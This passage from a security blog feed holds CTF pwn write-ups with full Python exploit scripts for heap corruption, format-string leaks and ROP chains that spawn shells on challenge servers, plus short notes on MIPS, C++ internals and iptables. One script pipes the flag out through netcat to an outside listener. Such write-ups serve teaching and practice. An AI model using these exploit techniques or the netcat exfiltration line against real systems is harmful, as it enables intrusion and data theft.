+ "\n")add(3, "a\n")add(3, p64(0) * 7 + p64(libc + 0x3c4b10 - 0x10))add(3, p64(libc + 0xf1147) + "\n")print hex(libc)#gdb.attach(r)r.sendline("1")r.sendlineafter("Large\n", str(1))r.interactive() login double free堆重叠后,通过login爆破获取libc,然后直接写结构体中的函数指针再次login调用system("/bin/sh")即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121from pwn import *context.log_level = 'debug'def login(ids, length, password): r.sendline("1") r.sendlineafter("user id:\n", str(ids)) r.sendlineafter("length:\n", str(length)) r.sendafter("password:\n", password) data = r.recvuntil("5.Exit\n") return datadef register(ids, length, password): r.sendline("2") r.sendlineafter("user id:\n", str(ids)) r.sendlineafter("length:\n", str(length)) r.sendafter("password:\n", password) r.recvuntil("5.Exit\n")def dele(ids): r.sendline("3") r.sendlineafter("user id:\n", str(ids)) r.recvuntil("5.Exit\n")def edit(ids, password): r.sendline("4") r.sendlineafter("user id:\n", str(ids)) r.sendafter("new pass:\n", password) r.recvuntil("5.Exit\n")#r = process("./login")r = remote("8sdafgh.gamectf.com", "20000")r.recvuntil("5.Exit\n")register(0, 0xf8, "a" * 0xf8)register(1, 0x18, "a" * 0x18)dele(0)dele(1)dele(0)register(2, 0x18, "\x20")edit(0, p64(0x100) + p64(0x21) + p64(0) * 3 + p64(0x21) + p64(0x602050) + p64(0x40089e) + p64(0x100))edit(1, p64(0) * 4 + "/bin/sh\x00")register(2, 0x28, "/bin/sh\x00" + "a" * 0x20)libc = 0x7fedit(0, "a" * 0x10 + "\x45")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 libc = libc % 0x100 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x44")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x43")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x42")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100edit(0, "a" * 0x10 + "\x41")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc * 0x100 + 0x78edit(0, "a" * 0x10 + "\x40")while(1): x = login(2, 0xff, p64(libc)) if "Wrong password!" in x: libc = libc + 1 else: breaklibc = libc - 0x7f4aa1c84b78 + 0x7f4aa18c0000edit(0, "a" * 0x10 + p64(0x602070) + p64(libc + 0x45390))r.sendline("1")r.sendlineafter("user id:\n", str(2))r.sendlineafter("length:\n", str(0xff))r.sendafter("password:\n", "/bin/sh\x00")print "libc: " + hex(libc)#gdb.attach(r)sleep(1)r.interactive() slient_note uaf导致堆溢出,unlink写got表爆破,1/4096概率调用system("/bin/sh"). 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level = 'debug'def add(choice, content): r.sendline("1") r.sendlineafter("add?\n", str(choice)) r.sendlineafter("Content:\n", content) r.recvuntil("4.Exit\n")def dele(choice): r.sendline("2") r.sendlineafter("delete?\n", str(choice)) r.recvuntil("4.Exit\n")def update(choice, content): r.sendline("3") r.sendlineafter("update?\n", str(choice)) r.sendlineafter("Content:\n", content) r.recvuntil("4.Exit\n")while 1: #r = process("./pwn") r = remote("8sdafgh.gamectf.com", "35555") r.recvuntil("4.Exit\n") add(2, p64(0) * 34 + p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)) add(1, "a") dele(2) for i in range(4): add(1, "a") payload = p64(0) + p64(0x81) + p64(0x6020d8 - 0x18) + p64(0x6020d8 - 0x10) + p64(0) * 10 payload += p64(0) + p64(0x41) payload += p64(0x80) + p64(0x90) update(2, payload) dele(1) #unlink payload = "/bin/sh\x00" + p64(0) + p64(0x602018) update(2, payload) update(1, "\x90\xa3\x75") try: r.sendline("2") r.sendlineafter("delete?\n", str(2)) #gdb.attach(r) r.recvuntil(":") r.sendline("icq53fedba7ec7cecf0fd369c6e0a6bd") r.recvline() break except EOFError as e: r.close()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hectf-2019-quals]]></title>
    <url>%2Fposts%2Fd8a417f2%2F</url>
    <content type="text"><![CDATA[pwn_disco 格式化字符串泄露地址,uaf漏洞,通过edit进行fastbin attack分配堆到bss段,修改堆指针任意写,改free_hook执行system("/bin/sh"). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *#r = process("./pwn_disco")r = remote("183.129.189.60", "10002")elf = ELF("./pwn_disco")r.sendlineafter("Choice:", "1")payload = "%9$pabcd\x00"r.sendlineafter("to draw:\n", payload)canary = int(r.recvuntil("abcd")[:-4], 16)r.sendlineafter("Choice:", "1")payload = "%11$pefhg\x00"r.sendlineafter("to draw:\n", payload)pie = int(r.recvuntil("efhg")[:-4], 16) + 0x55fd68136000 - 0x55fd68137020r.sendlineafter("Choice:", "1")payload = "%3$pefhg\x00"r.sendlineafter("to draw:\n", payload)libc = int(r.recvuntil("efhg")[:-4], 16) + 0x7f2bf217f000 - 0x7f2bf2276260r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "0")r.sendafter("color:", "a")r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "1")r.sendafter("color:", "/bin/sh\x00")r.sendlineafter("Choice:", "3")r.sendlineafter("index:", "0")r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "2")r.sendlineafter("index:", "0")r.sendafter("color:", p64(pie + 0x201890 + 0xd))r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "0")r.sendafter("color:", "a")r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "1")r.sendlineafter("index:", "0")r.sendafter("color:", "\x00" * 0x3 + p64(libc + 0x3c67a8))r.sendlineafter("Choice:", "2")r.sendlineafter("Choice:", "2")r.sendlineafter("index:", "0")r.sendafter("color:", p64(libc + 0x45390))r.sendlineafter("Choice:", "3")r.sendlineafter("index:", "1")#gdb.attach(r)print "canary: " + hex(canary)print "libc: " + hex(libc)print "pie: " + hex(pie)r.interactive() HongBao +\n会使scanf正常执行同时不改变对应的值,先格式化字符串漏洞泄露,再重用漏洞调用system("/bin/sh"). 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *context.log_level = 'debug'main = 0x4008E7pop_rdi_ret = 0x400b73#r = process("./HongBao")r = remote("183.129.189.60", "10001")elf = ELF("./HongBao")#gdb.attach(r, "b * 0x400AB9\nc")r.sendlineafter("HongBao?\n", "Y")payload = "%pzz" * 12 + "\n"r.sendlineafter(" you: ", payload)r.sendlineafter("us?\n", str(0x80))payload = "+\n" * 46payload += str(main % 0x100000000) + "\n"payload += str(main / 0x100000000) + "\n"payload += "+\n" * (0x80 - 48)r.sendafter("have?\n", payload)data = r.recvuntil("Do you")libc = int(data.split("zz")[1], 16) + 0x7fbc06132000 - 0x7fbc064f8790r.sendlineafter("HongBao?\n", "Y")payload = "w4rd3n\n"r.sendlineafter(" you: ", payload)r.sendlineafter("us?\n", str(0x80))payload = "+\n" * 46payload += str(pop_rdi_ret % 0x100000000) + "\n"payload += str(pop_rdi_ret / 0x100000000) + "\n"payload += str((libc + 0x18cd57) % 0x100000000) + "\n"payload += str((libc + 0x18cd57) / 0x100000000) + "\n"payload += str((libc + 0x45390) % 0x100000000) + "\n"payload += str((libc + 0x45390) / 0x100000000) + "\n"payload += "+\n" * (0x80 - 52)r.sendafter("have?\n", payload)print "libc: " + hex(libc)r.interactive() Hard_pwn unsorted bin加堆溢出泄露地址,然后就是house_of_orange. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level = 'debug'def add(size): r.sendline("1") r.sendlineafter("size: ", str(size)) r.recvuntil(": ")def edit(index, size, content): r.sendline("2") r.sendlineafter("index: ", str(index)) r.sendlineafter("size: ", str(size)) r.sendafter("content:", content) r.recvuntil(": ")def dele(index): r.sendline("3") r.sendlineafter("index: ", str(index)) r.recvuntil(": ")def show(index): r.sendline("4") r.sendlineafter("index: ", str(index)) data = r.recvuntil("\n")[:-1] r.recvuntil(": ") return data#r = process("./pwn")r = remote("183.129.189.60", "10026")r.recvuntil(": ")add(0x90)#0add(0x90)#1add(0x90)#2add(0x90)#3add(0x90)#4dele(1)edit(0, 0x450, "a" * 0xa0)libc = u64(show(0)[0xac:0xb2].ljust(8, "\x00")) + 0x7fa7d8484000 - 0x7fa7d8848b78edit(0, 0x450, "a" * 0x90 + p64(0) + p64(0xa1))dele(3)edit(2, 0x450, "a" * 0xa0)heap = u64(show(2)[0xac:0xb2].ljust(8, "\x00")) + 0x5618028f4000 - 0x5618028f40a0edit(2, 0x450, "a" * 0x90 + p64(0) + p64(0xa1))dele(0)dele(2)dele(4)add(0x90)#0add(0x400)#1add(0x90)#2dele(1)payload = "a" * 0x90fake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c5520 - 0x10)#3c5520 D _IO_list_all, fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(1) * 18 + p32(0x80000000) + "a" * 0x14#_IO_write_base, _IO_write_ptr, padding, _mode, _unused2fake_chunk += p64(heap + 0x1a0)#fake_vtable_ptrfake_chunk = fake_chunk.ljust(0x100, "\x00")#fake_chunk &lt;=&gt; fake_IO_FILEpayload += fake_chunkpayload += p64(libc + 0x45390) * 0x10#fake_vtableedit(0, 0x450, payload)r.sendline("1")r.sendlineafter("size: ", str(1))#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-assembly-MIPS-基础]]></title>
    <url>%2Fposts%2F5ac4314b%2F</url>
    <content type="text"><![CDATA[简介 MIPS是一种采取精简指令集RISC的指令集架构. MIPS采用了高度的流水线,其中一个重要的效应是分支延迟效应. 寄存器 MIPS32寄存器分为两类:通用寄存器和特殊寄存器. MIPS体系结构中有32个通用寄存器,汇编程序中用$0 ~ $31表示.也可以用名称表示,如$sp,$t1等. MIPS体系结构中有3个特殊寄存器:PC(程序计数器),HI(乘除结果高位寄存器)和LO(乘除结果低位寄存器). 指令 MIPS32指令特点:固定4字节指令长度;数据访问(load/store)必须严格对齐; 函数调用 MIPS32架构函数调用时对堆栈的分配和使用方式与x86架构有相似之处,但又有很大的区别. 没有ebp,进入一个函数时将当前栈指针向下移动n比特,这就是此函数的栈帧存储区域.如果函数A调用函数B,调用者函数A会在自己的栈顶预留一部分空间来保存被调用者函数B的参数,称之为调用参数空间. 前四个参数通过$a0 ~ $a3传递,多余的参数会放入调用参数空间. MIPS32的调用指令把函数的返回地址直接存入$ra寄存器中. MIPS32架构根据函数是否调用其他函数将函数分成叶子函数与非叶子函数. 父函数调用子函数时,会复制当前$PC的值到$ra寄存器,然后跳到子函数执行.子函数如果为非叶子函数,则会将返回地址存入堆栈,否则仍在$ra寄存器中. 返回时,如果子函数为叶子函数,jr $ra直接返回,否则先从堆栈取出再返回. 系统调用 MIPS32系统调用指令SYSCALL是一个软中断,系统调用号存放在$v0中,参数存放在$a0 ~ $a3中,如果参数过多,会存放在栈中.]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-CPP]]></title>
    <url>%2Fposts%2Fe7711785%2F</url>
    <content type="text"><![CDATA[概览 C++与C都是生成可执行程序,只不过C++有一些常用的自定义数据结构. mangle C++的符号名是被mangle过的,使用gdb时可以使用set print asm-demangle on恢复.类似的还有命令行工具c++filt. 虚函数表 虚函数是支持C++多态的关键机制,对于每个具有虚函数的类,编译器将根据类的继承层次结构创建一个或多个相关的虚函数表(位于只读段). 相应的对象实例会有一个虚函数表指针指向对于类的虚函数表,而虚表劫持就是通过其他漏洞修改类实例的虚函数表指针. 例题:强网杯-2019-babycpp,update函数中存在经典abs漏洞,可以修改C++类的vtable指针,爆破4位(1/16).通过string和int四个函数交互使用任意地址读写,通过libc中的environ变量泄露栈地址,最后写返回地址rop即可. vector vector是C++实现的动态数组类,空间不够时会申请两倍大小来放置内容,分配在堆中. 成员:_M_start,vector起始位置;_M_finish,vector结尾位置;_M_end_of_storage:容器最后位置. vector通过_M_finish和_M_end_of_storage判断空间是否足够. new &amp; delete new与malloc类似,但配置失败会进行异常处理,而malloc返回null. delete与free类似. 复制构造函数与赋值操作符 默认的复制构造函数与赋值操作符都是进行浅拷贝,也就是对于指针进行值复制. 默认使用复制构造函数的情况:对象作为函数参数,返回一个对象,部分容器操作等. 默认使用赋值操作符的情况:赋值语句,部分容器操作等.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-roarctf-2019]]></title>
    <url>%2Fposts%2Fe020a382%2F</url>
    <content type="text"><![CDATA[pwn easy_pwn 存在后门off_by_one,堆重叠后伪造堆块进行fastbin attack,劫持_malloc_hook后触发one_gadget获得shell. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *context.log_level = 'debug'def add(size): r.sendline('1') r.sendlineafter('size: ', str(size)) r.recvuntil('choice: ', timeout = 1)def edit(index, size, content): r.sendline('2') r.sendlineafter('index: ', str(index)) r.sendlineafter('size: ', str(size)) r.sendafter('content: ', content) r.recvuntil('choice: ', timeout = 1)def drop(index): r.sendline('3') r.sendlineafter('index: ', str(index)) r.recvuntil('choice: ', timeout = 1)def show(index): r.sendline('4') r.sendlineafter('index: ', str(index)) r.recvuntil('content: ') data = r.recvuntil('Note system')[:-11] r.recvuntil('choice: ', timeout = 1) return data#r = process('./easy_pwn')r = remote("39.97.182.233", "47400")r.recvuntil('choice: ', timeout = 1)add(0x78)#0add(0xe0)#1add(0x80)#2add(0x20)#3edit(1, 0xd8, "a" * 0xd0 + p64(0xe0))drop(1)edit(0, 0x82, "a" * 0x78 + "\xe1")add(0x80)#1add(0x40)#4drop(1)drop(2)add(0x80)#1libc = u64(show(4)[:6].ljust(8, "\x00")) - 0x3c4b78drop(1)add(0x100)#1edit(1, 0x100, "a" * 0x80 + p64(0) + p64(0x71) + "a" * 0x60 + p64(0) + p64(0x21))drop(4)edit(1, 0x98, "a" * 0x80 + p64(0) + p64(0x71) + p64(libc + 0x3c4b10 - 0x23))add(0x68)#2add(0x68)#4payload = "0" * 0x13 + p64(libc + 0xf02a4)edit(4, len(payload), payload)edit(1, 0x90, "a" * 0x80 + p64(0) + p64(0))drop(2)#gdb.attach(r)print "libc: " + hex(libc)r.interactive() easyheap 由于限制了chunk_size,可以使用scanf触发malloc_conslidate合并(过长的输入会让scanf申请堆)构造unsorted bin. 存在uaf,可以利用后门进行unlink,结合house_of_spirit写random从而泄露libc. 最后fastbin attack写__malloc_hook获取shell. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from pwn import *context.log_level = "debug"ptr = 0x602098def add(size, content): r.sendline("1") r.sendlineafter("the size\n", str(size)) r.sendafter("your content\n", content) r.recvuntil("&gt;&gt; ")def add2(size, content): sleep(0.1) r.sendline("1") sleep(0.1) r.sendline(str(size)) sleep(0.1) r.send(content) sleep(0.1)def dele(): r.sendline("2") r.recvuntil("&gt;&gt; ")def dele2(): sleep(0.1) r.sendline("2") sleep(0.1)def show(): r.sendline("3") data = r.recvuntil("every")[:-6] return datadef back(choice, content = ""): r.sendline("666") r.sendlineafter("or free?\n", str(choice)) if choice == 1: r.sendafter("your content\n", content) r.recvuntil("&gt;&gt; ")r = process("./pwn")r.sendafter("username:", p64(0) * 3 + p64(0x41))r.sendafter("info:", p64(0) + p64(0x51) + p64(0) + p64(0x51))r.recvuntil("&gt;&gt; ")add(0x20, "a" * 0x20)dele()add(0x50, "a" * 0x50)dele()add(0x30, "a" * 0x30)dele()add(0x60, "a" * 0x50 + p64(0) + p64(0x31))dele()add(0x10, "a" * 0x10)add(0x30, "a" * 0x30)dele()r.sendline("1" * 0x400)payload = p64(0) + p64(0x81) + p64(ptr - 0x18) + p64(ptr - 0x10)payload = payload.ljust(0x80, "\x00")payload += p64(0x80) + p64(0xa0)back(1, payload)dele()#unlinkback(2)#house_of_spiritadd(0x38, p64(0) * 2 + p64(0xDEADBEEFDEADBEEF))add(0x80, "a")libc = u64(show().ljust(8, "\x00")) + 0x7f4da9961000 - 0x7f4da9d25b61dele2()add2(0x10, "a")add2(0x68, "a")dele2()add2(0x80, "a")add2(0x40, "a" * 0x20 + p64(0) + p64(0x71) + p64(libc + 0x3c4b10 - 0x23))add2(0x68, "a")add2(0x68, "\x00" * 0x13 + p64(libc + 0xf02a4))dele2()#gdb.attach(r)print "libc: " + hex(libc)r.sendline("cat flag | nc 192.168.235.128 1234")r.interactive() 由于关闭了标准输出和标准错误输出,使用反弹shell传输flag.服务器端监听端口:nc -l 1234. easyrop 明显的栈溢出,注意溢出时会覆盖偏移变量.题目限制了execve,使用栈迁移加orw获取flag. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = 'debug'pop_rdi_ret = 0x401b93pop_rsi_r15_ret = 0x401b91pop_rsp_r13_r14_r15_ret = 0x401b8ddef csu_pop(r12, r13 = 0, r14 = 0, r15 = 0): payload1 = p64(0x401B8A) #pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn; payload1 += p64(0) + p64(1) payload1 += p64(r12) + p64(r13) + p64(r14) + p64(r15) return payload1#r12(r13, r14, r15)def csu_mov_call_pop(r12 = 0, r13 = 0, r14 = 0, r15 = 0): #mov rdx, r13;mov rsi, r14;mov edi, r15d;call qword ptr [r12 + rbx * 8];...; payload2 = p64(0x401B70) payload2 += p64(0xdeadbeef) + p64(0) + p64(1) payload2 += p64(r12) + p64(r13) + p64(r14) + p64(r15) return payload2r = process("./pwn")elf = ELF("./pwn")gdb.attach(r, "b * 0x401B2B\nc")r.sendafter("&gt;&gt; ", "a" * 0x418 + "\x28")payload = csu_pop(elf.got['puts'], 0x603060)payload += csu_mov_call_pop()payload += p64(0x4019F3)r.sendline(payload)r.recvline()libc = u64(r.recvline()[1:-1].ljust(8, "\x00")) + 0x7fbdeb9b1000 - 0x7fbdebd76620r.sendafter("&gt;&gt; ", "a" * 0x418 + "\x28")payload = p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(0x6030c0) + p64(0) + p64(libc + 0xf7250)payload += p64(pop_rsp_r13_r14_r15_ret) + p64(0x6030c0)r.sendline(payload)payload = p64(0) * 3payload += p64(pop_rdi_ret) + p64(0x6032c8) + p64(pop_rsi_r15_ret) + p64(2) + p64(0) + p64(libc + 0xf7030)payload += csu_pop(0x6032c0, 3, 0x6032c8, 0x20)payload += csu_mov_call_pop(elf.got['puts'], 0x6032c8)payload += csu_mov_call_pop()payload = payload.ljust(0x200, "\x00")payload += p64(libc + 0xf7250) + "flag\x00"r.send(payload)print "libc: " + hex(libc)r.interactive() realloc_magic 环境为libc2.27,明显的double free. 两个关键点:realloc在ptr != 0 &amp;&amp; size == 0时等同于free,返回值为0;realloc在ptr == 0时等同于malloc. 剩下的解题思路和de1ctf2019的weapon差不多,通过堆重叠劫持fd. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576from pwn import *def re(size, content): r.sendline("1") r.sendlineafter("Size?\n", str(size)) r.sendafter("Content?\n", content) r.recvuntil("&gt;&gt; ")def re_fr(): r.sendline("1") r.sendlineafter("Size?\n", str(0)) r.recvuntil("&gt;&gt; ")def fr(): r.sendline("2") r.recvuntil("&gt;&gt; ")def ba(): r.sendline("666") r.recvuntil("&gt;&gt; ")while(1): r = process("./pwn") r.recvuntil("&gt;&gt; ") re(0x68, "a") re_fr() re(0x88, "a") re_fr() re(0xa8, "a") re_fr() re(0x88, "a") for i in range(7): fr() re_fr() re(0x68, "a") re(0xf8, "\x00" * 0x68 + p64(0x21) + "\x60\x77") re_fr() re(0x88, "a") re_fr() try: r.sendline("1") r.sendlineafter("Size?\n", str(0x88)) r.sendafter("Content?\n", p64(0xfbad3887) + p64(0) * 3 + "\xc8") data = r.recvuntil(p64(0xffffffffffffffff), timeout = 1) if p64(0xffffffffffffffff) not in data: r.close() continue r.recvuntil("&gt;&gt; ") libc = u64(data[:6].ljust(8, "\x00")) - 0x7f9d716c6a00 + 0x7f9d712db000 free_hook = libc + 0x3ed8e8 system = libc + 0x4f440 ba() re(0xf8, "\x00" * 0x68 + p64(0xa1) + p64(free_hook - 8)) re_fr() re(0x18, "a") re_fr() re(0x18, "/bin/sh\x00" + p64(system)) except EOFError as e: r.close() continue gdb.attach(r) print "libc: " + hex(libc) breakfr()r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-bytectf-2019-finals-unknow]]></title>
    <url>%2Fposts%2Fcff0c71b%2F</url>
    <content type="text"><![CDATA[漏洞 程序使用了多线程处理2对应的操作,start_routine是处理函数. 逆向发现在获取堆指针的值之后处理函数会休眠一段时间,这里出现了条件竞争漏洞,只需要在此时改变堆指针布局就可以劫持控制流. 利用思路 payload. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *context.log_level = 'debug'pop_rdi_ret = 0x42334dpop_rsi_ret = 0x42327bpop_rdx_ret = 0x4bb153cout_char_str = 0x407220_ZNSi4readEPcl_plt = 0x403c90def add(size, content): r.sendlineafter("Options:", "1") r.sendlineafter("size:", str(size)) r.sendlineafter("Data:", content) r.recvuntil("Success") offset = int(r.recvuntil("\n")[:-1]) print "offset: " + hex(offset)#r = process("./pwn")r = remote("172.29.18.11", "9999")gdb.attach(r, "b * 0x407843")add(128, "a" * 0x67 + p64(0x4079d1) + "\x00" + p64(0) * 2)#chunk1add(80, "b" * 0x50)add(80, "a" * 0x10 + p64(0x45d9ca) + p64(0) * 7)#chunk3add(32, "d" * 0x20)r.sendlineafter("Options:", "2")payload = "c" * 0xcd2f + p64(pop_rdi_ret) + p64(0x6eefd8) + p64(cout_char_str) + p64(pop_rdi_ret) + p64(0x6ef600) + p64(pop_rsi_ret) + p64(0x6ef340) + p64(pop_rdx_ret) + p64(0x8)payload += p64(_ZNSi4readEPcl_plt) + p64(0x4079d1) + p64(0x405610) + "1" + p64(0xdeadbeef) * 10payload = payload.ljust(0xd000, "\x00")add(53248, payload)#chunk5payload = p64(0x4a0dc0) + p8(0x78)#.rodata:00000000004A0DC0 off_4A0DC0 dq offset unk_6EE1E0#unk_6EE1F0处的值指向_ZNKSt9type_info15__is_function_pEv.#通过偏移使第二个处理参数指向chunk3,调用0x45d9ca执行关键指令xchg esp,eax#处理完后esp刚好指向chunk1中,布置好gadget:ret,同时栈跨越到chunk5中,布置好rop链.#0x405610会调用0x6eefd8r.sendlineafter("Options:", "1")r.sendlineafter("size:", str(32))r.sendafter("Data:", payload)libc = u64(r.recv()[:6].ljust(8, "\x00")) - 0x21ab0r.send("a" * 7 + p64(libc + 0x10a38c)* 9)print "libc: " + hex(libc)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-operations-Linux-iptables]]></title>
    <url>%2Fposts%2Fe5fe5129%2F</url>
    <content type="text"><![CDATA[简介 iptables命令是Linux上常用的防火墙软件,属于netfilter项目的一部分.可直接配置,也可以通过前端和图形界面配置. 选项 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748-t, --table table#对指定的表table进行操作,table必须是raw,nat,filtermangle中的一个.如果不指定此选项,默认的是filter表.-p#指定要匹配的数据包协议类型-s, --source [!] address[/mask]#把指定的一个/一组地址作为源地址,按此规则进行过滤.当后面没有mask时,address是一个地址;当mask指定时,可以表示一组范围内的地址,比如:192.168.1.0/255.255.255.0.-d, --destination [!] address[/mask]#地址格式同上,但这里是指定地址为目的地址,按此进行过滤.-i, --in-interface [!] &lt;网络接口name&gt;#指定数据包的来自来自网络接口,比如最常见的eth0.注意:它只对INPUT,FORWARD,PREROUTING这三个链起作用.如果没有指定此选项,说明可以来自任何一个网络接口.同前面类似,"!"表示取反.-o, --out-interface [!] &lt;网络接口name&gt;#指定数据包出去的网络接口.只对OUTPUT,FORWARD,POSTROUTING三个链起作用.--dport num#匹配目标端口号--sport num#匹配来源端口号-L, --list [chain]#列出链chain上面的所有规则,如果没有指定链,列出表上所有链的所有规则.-A, --append chain rule-specification#在指定链chain的末尾插入指定的规则,最后才会被执行.规则是由后面的匹配来指定.-I, --insert chain [rulenum] rule-specification#在链chain中的指定位置插入一条或多条规则.如果指定的规则号是1,则在链的头部插入.这也是默认的情况.-D, --delete chain rule-specification -D, --delete chain rulenum#在指定的链chain中删除一个或多个指定规则.-R num#Replays替换/修改第几条规则.-P, --policy chain target#为指定的链chain设置策略target.注意,只有内置的链才允许有策略,用户自定义的是不允许的.-F, --flush [chain]#清空指定链chain上面的所有规则.如果没有指定链,清空该表上所有链的所有规则.-N, --new-chain chain#用指定的名字创建一个新的链.-X, --delete-chain [chain]#删除指定的链,这个链必须没有被其它任何规则引用,而且这条上必须没有任何规则.如果没有指定链名,则会删除该表中所有非内置的链.-E, --rename-chain old-chain new-chain#用指定的新名字去重命名指定的链,这并不会对链内部照成任何影响.-Z, --zero [chain]#把指定链,或者表中的所有链上的所有计数器清零.-j, --jump target &lt;指定目标&gt;#即满足某条件时该执行什么样的动作.target可以是内置的目标,比如ACCEPT,也可以是用户自定义的链.-h#显示帮助信息. 命令举例:iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作. 工作机制 规则链名包括(也被称为五个钩子函数): INPUT链:处理输入数据包. OUTPUT链:处理输出数据包. FORWARD链:处理转发数据包. PREROUTING链:用于目标地址转换(DNAT). POSTOUTING链:用于源地址转换(SNAT). 防火墙策略一般分为两种,一种叫通策略,一种叫堵策略.通策略,默认门是关着的,必须要定义谁能进;堵策略则是,大门是洞开的,但是你必须有身份认证,否则不能进. filter定义允许或者不允许,只能作用在3个链上:INPUT,FORWARD,OUTPUT. nat定义地址转换,只能作用在3个链上:PREROUTING,OUTPUT,POSTROUTING. mangle修改报文原数据,5个链都可以使用.修改报文原数据就是修改TTL.能够将数据包的元数据拆开,在里面做标记/修改内容.防火墙标记其实就是靠mangle来实现的. 表名包括: raw:高级功能,如:网址过滤. mangle:数据包修改(QOS),用于实现服务质量. nat:地址转换,用于网关路由器. filter:包过滤,用于防火墙规则. 动作包括: ACCEPT:接收数据包. DROP:丢弃数据包. REDIRECT:重定向,映射,透明代理. SNAT:源地址转换. DNAT:目标地址转换. MASQUERADE:IP伪装(NAT),用于ADSL LOG:日志记录. 实例 12345678910111213141516171819202122iptables -F#清空所有的防火墙规则.iptables -X#删除用户自定义的空链.iptables -Z#清空计数.iptables -A INPUT -s 192.168.1.0/24 -p tcp --dport 22 -j ACCEPT#22为ssh端口,-s 192.168.1.0/24表示允许这个网段的机器来连接,-j ACCEPT表示接受请求.iptables -P INPUT DROP#配置默认的不让进.iptables -P FORWARD DROP#默认的不允许转发.iptables -P OUTPUT ACCEPT#默认的可以出去.iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT#允许被ping.iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT#已经建立的连接让它进来.iptables-save &gt; /etc/sysconfig/iptables#保存规则到配置文件中.cp /etc/sysconfig/iptables /etc/sysconfig/iptables.bak#备份配置文件.]]></content>
      <categories>
        <category>CS</category>
        <category>operations</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ogeek-2019-babyheap]]></title>
    <url>%2Fposts%2F6b700116%2F</url>
    <content type="text"><![CDATA[babyheap polish函数堆溢出. 1234567891011void polish()&#123; /* code */ scanf_wrapper("%d", size); puts("Then name it again : "); read_n(g_sword[idx], size); /* code */&#125; 可以利用该漏洞进行unlink攻击,为了绕过对chunk header的检测需要泄露Freed chunk的chunk header.要防止fake_chunk是ListHints的表头,否则会导致check失败. 任意读写后就可以通过iat表泄露dll基址,再通过ntdll!PebLdr附近的一个地址减偏移获得PEB地址,又PEB和TEB的地址的偏移是固定的,计算出线程的TEB的地址,最后通过TEB泄露SEH地址减偏移获得返回地址的地址劫持控制流即可. 由于环境原因payload只完成到泄露部分. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *context.log_level = "debug"def make(size, content): r.sendlineafter("your choice?", "1") r.sendlineafter("your sword?", str(size)) r.sendlineafter("Name it!", content)def destroy(index): r.sendlineafter("your choice?", "2") r.sendlineafter("want to destroy?", str(index))def polish(index, size, content): r.sendlineafter("your choice?", "3") r.sendlineafter("you polish?", str(index)) r.sendlineafter("length this time?", str(size)) r.sendlineafter("it again : ", content)def check(index): r.sendlineafter("your choice?", "4") r.sendlineafter("will you check?", 